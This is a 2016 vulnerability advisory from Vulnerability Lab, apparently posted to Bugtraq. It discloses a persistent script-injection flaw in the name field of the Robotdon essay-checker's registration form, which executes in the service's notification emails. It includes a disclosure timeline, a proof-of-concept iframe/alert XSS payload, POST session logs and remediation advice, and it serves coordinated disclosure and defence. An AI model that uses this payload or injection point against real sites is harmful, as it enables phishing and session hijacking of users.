
Date: Mon, 7 Nov 2016 11:04:28 +0100
From: Vulnerability Lab <research@...nerability-lab.com>
To: bugtraq@...urityfocus.com, bugs@...uritytracker.com
Subject: Edusson (Robotdon) BB - Filter Bypass & Persistent Vulnerability

Document Title:
===============
Edusson (Robotdon) BB - Filter Bypass & Persistent Vulnerability


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1870


Release Date:
=============
2016-11-03


Vulnerability Laboratory ID (VL-ID):
====================================
1870


Common Vulnerability Scoring System:
====================================
4.3


Product & Service Introduction:
===============================
Meet Robot Don - a free essay checker software that brings so much fun into your essay editing / proofreading.
We have created Robot Don, machine learning tool that facilitates essay writing, free for all students. We continuously 
receive bug reports and suggestions from different areas. To honor the bright external contributions that help us 
build a better product we have  launched a Bug & Ideas Hunting (BIH) Contest for Robot Don. Any of service or feature 
provided by Robot Don software is intended to be in scope of this scholarship/ contest. This includes all content and 
algos available through robotdon.com

(Copy of the Vendor Homepage: http://edusson.com/robot-don )


Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered an application-side vulnerability and a filter bypass issue in the official Edusson Robotdon web-application.


Vulnerability Disclosure Timeline:
==================================
2016-06-10: Researcher Notification & Coordination (Benjamin Kunz Mejri)
2016-06-11: Vendor Notification (Edusson Security Team)
2016-06-20: Vendor Response/Feedback (Edusson Security Team)
2016-**-**: Vendor Fix/Patch (Edusson Robotdon Developer Team)
2016-11-03: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
Edusson
Product: Robotdon - Online Service (Web-Application) 2016 Q2


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
An application-side input and mail encode web vulnerability has been discovered in the official Edusson Robotdon (tools) web-application.
The vulnerability allows remote attackers to inject own malicious script codes to the application-side of the vulnerable module or function.

The vulnerability is located in the reg_name parameter of the ./register module POST method request. Remote attackers are able to inject own 
malicious script codes to the email body context of the inf@...otdon.com reply notification. The injection point of the vulnerability is the 
registration formular with the wrong encoded name input field. The execution point occurs in the email that is send by the service after the 
registration has been solved. The attacker vector of the vulnerability is persistent on the application-side and the request method to inject 
the payload is POST. The vulnerability allows an attacker to inject malicious codes to the email context to spoof, phish or manipulate with 
the original email replier. The context of the payload is saved to the database management system and can execute with persistent vector in 
other notifications as well. 

The security risk of the application-side vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 4.3. 
Exploitation of the persistent mail encode web vulnerability requires no privileged user account and only low user interaction (click/include). 
Successful exploitation of the vulnerability results in persistent phishing mails, session hijacking, persistent external redirect to malicious 
sources and application-side manipulation of affected or connected module context.

Request Method(s):
				[+] POST

Vulnerable Module(s)
				[+] ./register (robotdon)
 
Vulnerable Input(s):
				[+] Name

Vulnerable Parameter(s)
				[+] reg_name

Affected Module(s)
				[+] Mail Message Body


Proof of Concept (PoC):
=======================
The persistent input and mail encode web vulnerability can be exploited by remote attackers without user account and with low user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.


Vulnerable Input(s): (Inject)
http://tools.robotdon.com/registered
http://tools.robotdon.com/register


PoC: Payload(s)
"" >"<iframe src=x onload=alert("APPROVED") <%20


--- PoC Session Logs [POST] (Inject) ---
Status: 200[OK]
POST http://tools.robotdon.com/registration Load Flags[LOAD_BACKGROUND  LOAD_BYPASS_LOCAL_CACHE  ] Größe des Inhalts[-1] Mime Type[text/html]
   Request Header:
      Host[tools.robotdon.com]
      User-Agent[Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0]
      Accept[text/plain, */*; q=0.01]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      DNT[1]
      Content-Type[application/x-www-form-urlencoded; charset=UTF-8]
      X-Requested-With[XMLHttpRequest]
      Referer[http://tools.robotdon.com/register]
      Content-Length[1130]
      Connection[keep-alive]
   POST-Daten:
      user_reg_name[%22%3E%3Ciframe%3E%2520%3E%22%3Ciframe+src%3Da%3E%2520%3Cimg%3E]
      user_reg_email[bkm%40evolution-sec.com]
      user_reg_password[666]
      captcha_key[03AHJ_VuvK4c4JYL-1DcDjoAz6PwXopJtuZhfdRGFNGbwBoqOVPsr3zZSLtbU38GQYIetSDZAjMId-2dIlQCfdeh80ugOasu3xUd8JXhxdX8PsjjyjDkvMy9qRaFfyUQxm3-VaueR4iH-dL1n1AwHq_PW20f084i2BET9kzPrvQlCIueNXqqaNVv1uW30qaAEivainuEdGW_sj19CR1UhzJVbNh0aTBdC_YO4JGZJwBHtGSc2ckfevfna6tz_VLPK_5eCRoNA5QZTbDBPWprc63mPXtMnzHbVXmNBodpEFmXEdtvH72ZYgMSlTlyECZ8v-4wqNdqGmY5exOW4nVYEadK_W7GTkiCZDyOmNvSKHcJKBW805DFTSrvGHA4FIN2VLKZGyla8bR46VNiJky2OfzaCvH-F7ESsWkSzzbgJgdAlnVJgX1NP0kSSO39AxjV_2Cx1zUzRQouqeuxiuW-cPyDu6HiDvGo2reSw0km-txyJXwxIt2c6_d3RXZPKOiCypyqygkmV_Mga7m-c7dAhYQVLkN3lW36_-uAEYlCNKmHcrG0zWTA0Ou-yRR-iFT0wIlpBg-CVUqqLXRm-h-ro8moPr_rttTFPTqJ1i-vPcfURM_DVTedPOjMUsaJkPDG2xOzh-fVETHF37zLUTDVIXSkyk-WdcJV1xOvL1CvAej67YjRMSlEUUKvbxziOd5gKc6grkgD4XwWkMwvqafX_BQ9h6qA8FCHE6YsVR6A-X9EFI7SbFBH-7i_zA3BjuQ0_pF1hrC8cuWFWGySTeaTRzD7XiOa1pNsTHFp5pP45Q8nZoGdMm8lifAjwMh-hBD5lDjIDqwwDc7wrZrCC_jMNZk4bT3JT-VeBREqrbh2c5Qx-UXLDjGmQTp5XKricC4r_GOLWg5zcpdYQgaLpEc_ZI-4UG7ysEVQt0c-V_bgHfKHZaUIlkMzoFWcnGJp972e91iJwAAv9e97q1]
   Response Header:
      Server[nginx/1.6.2]
      Date[Fri, 10 Jun 2016 16:46:05 GMT]
      Content-Type[text/html; charset=UTF-8]
      Transfer-Encoding[chunked]
      Connection[keep-alive]
      Content-Encoding[gzip]

Status: 200[OK]
GET http://tools.robotdon.com/registered Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[-1] Mime Type[text/html]
   Request Header:
      Host[tools.robotdon.com]
      User-Agent[Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      DNT[1]
      Referer[http://tools.robotdon.com/register]
      Connection[keep-alive]
   Response Header:
      Server[nginx/1.6.2]
      Content-Type[text/html; charset=UTF-8]
      Transfer-Encoding[chunked]
      Connection[keep-alive]
      Cache-Control[no-cache]
      Date[Fri, 10 Jun 2016 16:46:05 GMT]
      Content-Encoding[gzip]


Solution - Fix & Patch:
=======================
The application-side security web vulnerability can be patched by a secure restriction and encode of the input fields.
Disallow the usage of special chars and encode the parameter of the reg_name in the register POST method request. 
Ensure that the outgoing mail body encodes or parses the name parameters next to sending the context to anothers email.


Security Risk:
==============
The security risk of the application-side input validation web vulnerability in the edusson robotdon web-application is estimated as medium. (CVSS 4.3)


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (research@...nerability-lab.com) [http://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.] [www.vulnerability-lab.com]


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or implied, 
including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any case of damage, 
including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab or its suppliers have been advised 
of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing 
limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface websites, hack into databases or trade with stolen data.

Domains:    www.vulnerability-lab.com 		- www.vuln-lab.com 						- www.evolution-sec.com
Contact:    admin@...nerability-lab.com 	- research@...nerability-lab.com 				- admin@...lution-sec.com
Section:    magazine.vulnerability-lab.com 	- vulnerability-lab.com/contact.php 				- evolution-sec.com/contact
Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php 	- vulnerability-lab.com/rss/rss_upcoming.php 			- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php 	- vulnerability-lab.com/list-of-bug-bounty-programs.php 	- vulnerability-lab.com/register.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to electronically 
redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by Vulnerability-Lab Research Team or 
its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark of vulnerability-lab team & the specific 
authors or managers. To record, list, modify, use or edit our material contact (admin@ or research@...nerability-lab.com) to get a ask permission.

				    Copyright © 2016 | Vulnerability Laboratory - [Evolution Security GmbH]™


-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com



